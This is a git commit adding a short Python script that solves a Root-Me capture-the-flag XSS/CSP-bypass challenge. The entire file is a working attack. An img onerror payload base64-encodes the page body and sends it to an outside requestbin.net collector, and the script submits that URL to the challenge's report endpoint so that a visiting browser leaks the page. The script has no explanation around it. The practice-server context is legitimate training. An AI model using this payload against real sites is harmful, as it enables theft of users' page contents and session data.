b3882d0022c0317bb1f0817045eab10cfce01c82
huydoppa <58453296+huydoppa@users.noreply.github.com>
2021-06-09 22:59:40 +0700

    up

---
+++ root_me/cspbypass.py
@@ -0,0 +1,11 @@
+import requests 
+url = 'http://challenge01.root-me.org:58008/report'
+url1 = 'http://challenge01.root-me.org:58008/page?user='
+
+
+pay1 = '''<img/src =x onerror="window.top.location = '//requestbin.net/r/fq5uqccc?flag='.concat(btoa(encodeURIComponent(document.body.innerHTML)))">'''
+
+data = {'url':url1+pay1}
+x = requests.post(url,data=data)
+
+# check the url and get result
